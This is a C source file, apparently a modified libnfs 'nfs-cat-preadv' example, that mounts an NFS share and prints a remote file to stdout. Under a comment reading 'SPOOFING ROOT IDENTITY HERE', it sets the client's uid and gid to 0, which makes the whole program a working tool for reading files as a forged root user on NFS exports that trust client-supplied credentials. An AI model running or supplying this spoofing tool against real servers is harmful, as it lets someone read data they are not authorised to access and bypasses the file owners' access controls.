#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <string.h>
#include <sys/stat.h>
#include "libnfs.h"
#include "libnfs-raw.h"
#include "libnfs-raw-mount.h"

#define _FILE_OFFSET_BITS 64
#define _GNU_SOURCE

struct file_context {
    int fd;
    struct nfs_context *nfs;
    struct nfsfh *nfsfh;
    struct nfs_url *url;
};

void usage(void)
{
    fprintf(stderr, "Usage: nfs-cat-preadv <file>\n");
    fprintf(stderr, "<file> cat an nfs file.\n");
    exit(0);
}

static void
free_file_context(struct file_context *file_context)
{
    if (file_context->fd != -1) {
        close(file_context->fd);
    }
    if (file_context->nfsfh != NULL) {
        nfs_close(file_context->nfs, file_context->nfsfh);
    }
    if (file_context->nfs != NULL) {
        nfs_destroy_context(file_context->nfs);
    }
    if (file_context->url != NULL) {
        nfs_destroy_url(file_context->url);
    }
    free(file_context);
}

static struct file_context *
open_file(const char *url, int flags)
{
    struct file_context *file_context;

    file_context = malloc(sizeof(struct file_context));
    if (file_context == NULL) {
        fprintf(stderr, "Failed to malloc file_context\n");
        return NULL;
    }
    file_context->fd     = -1;
    file_context->nfs    = NULL;
    file_context->nfsfh  = NULL;
    file_context->url    = NULL;
    
    file_context->nfs = nfs_init_context();
    if (file_context->nfs == NULL) {
        fprintf(stderr, "failed to init context\n");
        free_file_context(file_context);
        return NULL;
    }

    /* SPOOFING ROOT IDENTITY HERE */
    nfs_set_uid(file_context->nfs, 0); 
    nfs_set_gid(file_context->nfs, 0);

    file_context->url = nfs_parse_url_full(file_context->nfs, url);
    if (file_context->url == NULL) {
        fprintf(stderr, "%s\n", nfs_get_error(file_context->nfs));
        free_file_context(file_context);
        return NULL;
    }

    if (nfs_mount(file_context->nfs, file_context->url->server,
                file_context->url->path) != 0) {
        fprintf(stderr, "Failed to mount nfs share : %s\n",
               nfs_get_error(file_context->nfs));
        free_file_context(file_context);
        return NULL;
    }

    if (flags == O_RDONLY) {
        if (nfs_open(file_context->nfs, file_context->url->file, flags,
                &file_context->nfsfh) != 0) {
            fprintf(stderr, "Failed to open file %s: %s\n",
                       file_context->url->file,
                       nfs_get_error(file_context->nfs));
            free_file_context(file_context);
            return NULL;
        }
    } else {
        if (nfs_creat(file_context->nfs, file_context->url->file, 0660,
                &file_context->nfsfh) != 0) {
            fprintf(stderr, "Failed to creat file %s: %s\n",
                       file_context->url->file,
                       nfs_get_error(file_context->nfs));
            free_file_context(file_context);
            return NULL;
        }
    }
    return file_context;
}

#define BUFSIZE 10240
static char buf2[BUFSIZE];
static char buf1[BUFSIZE];
static char buf0[BUFSIZE];

int main(int argc, char *argv[])
{
    struct file_context *nf;
    struct nfs_stat_64 st;
    uint64_t off;
    int64_t count;
    int i;
    
    if (argc < 2) {
        usage();
    }

    nf = open_file(argv[1], O_RDONLY);
    if (nf == NULL) {
        fprintf(stderr, "Failed to open %s\n", argv[1]);
        exit(10);
    }
    if (nfs_fstat64(nf->nfs, nf->nfsfh, &st) < 0) {
        fprintf(stderr, "Failed to stat %s\n", argv[1]);
        exit(10);
    }

    off = 0;
    while (off < st.nfs_size) {
        struct iovec iov[3];
 
        iov[0].iov_base = buf0;
        iov[0].iov_len = sizeof(buf0);
        iov[1].iov_base = buf1;
        iov[1].iov_len = sizeof(buf1);
        iov[2].iov_base = buf2;
        iov[2].iov_len = sizeof(buf2);
        
        count = nfs_preadv(nf->nfs, nf->nfsfh, iov, 3, off);
        if (count < 0) {
            fprintf(stderr, "Failed to read from file\n");
            free_file_context(nf);
            return 10;
        }
        if (count == 0) {
            break;
        }
        off += count;
        for (i = 0; i < 3; i++) {
            if (count >= iov[i].iov_len) {
                fwrite(iov[i].iov_base, iov[i].iov_len, 1, stdout);
                count -= iov[i].iov_len;
            } else {
                fwrite(iov[i].iov_base, count, 1, stdout);
                count = 0;
            }
            if (count == 0) {
                break;
            }
        }
    }

    free_file_context(nf);
    return 0;
}